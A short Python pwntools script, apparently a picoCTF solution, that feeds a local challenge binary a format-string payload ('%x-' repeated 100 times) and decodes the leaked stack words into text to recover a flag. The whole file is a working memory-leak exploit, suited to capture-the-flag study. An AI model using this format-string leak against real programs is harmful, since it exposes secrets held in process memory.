#!/usr/bin/python3

from pwn import *
import re

f_path = "./test.o"
p = process(f_path, stdin=PIPE, stdout=PIPE)
s = ""

p.sendline("secret")

arg = "%x-" * 100
p.sendline(arg)

output = p.recvall().decode("latin-1")

print(output)

for i in output.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

print(s)
#print(re.findall("picoCTF\{.*?\}", s)[0])
